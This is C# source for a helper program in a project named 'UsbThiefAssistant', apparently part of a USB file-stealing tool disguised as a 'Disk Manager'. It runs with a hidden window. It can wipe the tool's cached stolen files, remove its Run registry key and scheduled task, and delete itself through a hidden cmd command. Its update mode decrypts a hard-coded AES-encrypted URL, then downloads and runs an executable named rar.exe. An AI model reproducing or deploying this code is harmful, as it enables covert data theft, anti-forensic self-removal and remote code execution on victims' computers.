using Microsoft.Win32;
using Microsoft.Win32.TaskScheduler;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace UsbThiefAssistant
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            string[] args = Environment.GetCommandLineArgs();//作用相当于输入参数的string数组
            if (args.Length < 2)
                Environment.Exit(0);
            switch (args[1])
            {
                case "-clean":
                    Clean();
                    break;
                case "-suicide":
                    Suicide();
                    break;
                default:
                    if (args[1].StartsWith("-update="))
                    {
                        Upd(args[1].Substring(8));
                    }
                    else
                    {
                        Environment.Exit(0);
                    }
                    break;
            }
            InitializeComponent();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            SetVisibleCore(false);
        }
        protected override void SetVisibleCore(bool value)
        {
            base.SetVisibleCore(value);
        }
        private void KillProcess()
        {
            try
            {
                Process[] pro = Process.GetProcesses();
                foreach (var item in pro)
                {
                    if (item.ProcessName == "diskmanager")
                    {
                        item.Kill();
                    }
                }
            }
            catch (Exception)
            {
            }
        }
        public void DeleteFolder(string folderPath)
        {
            try
            {
                DirectoryInfo fileInfo = new DirectoryInfo(folderPath)
                {
                    Attributes = FileAttributes.Normal & FileAttributes.Directory
                };
                File.SetAttributes(folderPath, FileAttributes.Normal);  //去除文件的只读属性
                if (Directory.Exists(folderPath))
                {
                    foreach (string f in Directory.GetFileSystemEntries(folderPath))
                    {
                        if (File.Exists(f))   //判断文件夹是否还存在
                        {
                            //如果有子文件删除文件
                            File.Delete(f);
                        }
                        else
                        {
                            //循环递归删除子文件夹
                            DeleteFolder(f);
                        }
                    }
                    //删除空根文件夹。即传来一个文件夹如：/upload/kahnFolder/,则最后将根文件夹kahnFolder也删除掉
                    //Directory.Delete(folderPath);
                }
            }
            catch (Exception)  // 异常处理
            {
            }
        }
        private string AesDecrypt(string str, string key)
        {
            if (string.IsNullOrEmpty(str)) return null;
            byte[] toEncryptArray = Convert.FromBase64String(str);
            using (RijndaelManaged rm = new RijndaelManaged
            {
                Key = Encoding.UTF8.GetBytes(key),
                Mode = CipherMode.ECB,
                Padding = PaddingMode.PKCS7
            })
            {
                ICryptoTransform cTransform = rm.CreateDecryptor();
                byte[] resultArray = cTransform.TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length);
                return Encoding.UTF8.GetString(resultArray);
            }
        }
        ///<summary>
        /// 下载文件
        /// </summary>
        /// <param name="URL">下载文件地址</param>
        /// <param name="Filename">下载后另存为（全路径）</param>
        private bool DownloadFile(string URL, string filename)
        {
            try
            {
                HttpWebRequest Myrq = (HttpWebRequest)HttpWebRequest.Create(URL);
                HttpWebResponse myrp = (HttpWebResponse)Myrq.GetResponse();
                Stream st = myrp.GetResponseStream();
                Stream so = new FileStream(filename, FileMode.Create);
                byte[] by = new byte[1024];
                int osize = st.Read(by, 0, (int)by.Length);
                while (osize > 0)
                {
                    so.Write(by, 0, osize);
                    osize = st.Read(by, 0, (int)by.Length);
                }
                so.Close();
                st.Close();
                myrp.Close();
                Myrq.Abort();
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }
        private void Clean()
        {
            string path = Application.StartupPath + "\\data\\diskcache\\files";
            KillProcess();
            DeleteFolder(path);
            Process.Start(Application.StartupPath + "\\diskmanager.exe", "-run");
            Environment.Exit(0);
        }
        private void Suicide()
        {
            try
            {
                string p = Application.ExecutablePath;
                RegistryKey rk = Registry.CurrentUser;
                RegistryKey rk2 = rk.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
                if (rk2.GetValue("Disk Manager") != null)
                {
                    rk2.DeleteValue("Disk Manager");
                }
                rk2.Close();
                rk.Close();
                if (TaskService.Instance.FindTask("Clean Files") != null)
                {
                    TaskService ts = new TaskService();
                    TaskFolder tf = ts.RootFolder;
                    tf.DeleteTask("Clean Files");
                    ts.Dispose();
                }
            }
            catch (Exception)
            {
            }
            string path = Application.StartupPath;
            KillProcess();
            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/C Timeout /T 5 & Rd /S /Q " + path)
            {
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            };
            Process.Start(psi);
            Environment.Exit(0);
        }
        private void Upd(string text)
        {
            string addr = AesDecrypt(text, "TFOKUiRKVwQPUxaGc4AMOoAmshXao29j");
            string r = @"((http|ftp|https)://)(([a-zA-Z0-9\._-]+\.[a-zA-Z]{2,6})|([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}))(:[0-9]{1,4})*(/[a-zA-Z0-9\&%_\./-~-]*)?";
            Regex regex = new Regex(r);
            if (regex.IsMatch(addr))
            {

                DownloadFile(addr, Application.StartupPath + "\\rar.exe");
                try
                {
                    Process.Start(Application.StartupPath + "\\rar.exe");
                }
                catch (Exception)
                {
                }
            }
            Environment.Exit(0);
        }
    }
}
